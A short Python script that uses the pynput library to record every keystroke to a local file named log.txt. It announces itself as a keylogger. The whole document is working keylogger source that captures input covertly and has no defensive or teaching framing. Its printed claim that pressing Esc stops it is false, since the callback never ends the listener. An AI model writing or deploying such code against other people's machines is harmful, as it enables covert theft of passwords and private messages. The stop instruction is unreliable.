from pynput.keyboard import Key, Listener

def log_key(key):
    key = str(key).replace("'", "")
    with open("log.txt", 'a') as log_file:
        log_file.write(key + "\n")

def start_logging():
    with Listener(on_press=log_key) as listener:
        listener.join()

if __name__ == "__main__":
    print("Keylogger Started... (Press 'Esc' to stop)")
    start_logging()
